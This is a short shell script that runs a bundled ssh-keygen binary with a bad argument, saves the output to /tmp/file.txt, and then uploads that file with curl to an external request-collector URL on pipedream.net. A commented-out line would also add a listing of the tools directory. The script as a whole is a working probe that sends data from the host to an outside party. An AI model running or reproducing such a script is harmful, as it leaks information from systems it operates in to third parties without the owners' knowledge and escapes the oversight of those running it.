#!/bin/sh

echo $(tools/ssh-keygen --invalid-argument) > /tmp/file.txt

echo "--------------" >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt

# echo $(ls -la tools/) >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
